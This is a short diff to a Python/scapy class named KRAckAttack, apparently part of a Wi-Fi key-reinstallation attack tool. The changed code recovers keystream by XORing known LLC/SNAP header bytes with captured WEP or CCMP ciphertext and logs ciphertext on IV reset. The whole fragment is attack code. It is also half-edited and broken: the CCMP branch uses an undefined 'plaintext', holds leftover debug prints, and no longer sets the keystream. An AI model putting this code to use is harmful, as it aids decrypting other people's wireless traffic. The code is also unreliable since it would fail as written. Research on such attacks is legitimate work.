@@ -321,15 +321,16 @@ class KRAckAttack():
 		if args.group: return
 
 		if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
-			plaintext = "\xaa\xaa\x03\x00\x00\x00"
 			if p.haslayer(Dot11WEP):
-			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
-				encrypted = p[Dot11WEP].wepdata[4:4:4+len(plaintext)]
+				plaintext = "\xaa\xaa\x03\x00\x00\x00"
+				# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
+				encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
+				keystream = xorstr(plaintext, encrypted)
 			else:
+				print(type(p[Dot11CCMP].data[:len(plaintext)]))
 				print(p[Dot11CCMP].data[:len(plaintext)])
-				# encrypted = p[Dot11CCMP].data[:len(plaintext)]
-
-			keystream = xorstr(plaintext, encrypted)
+				# plaintext = b"\xaa\xaa\x03\x00\x00\x00"
+				# encrypted = bytes(p[Dot11CCMP].data[:len(plaintext)])
 
 			iv = dot11_get_iv(p)
 			if iv <= 1: log(STATUS, "Ciphertext: " + encrypted, showtime=False)
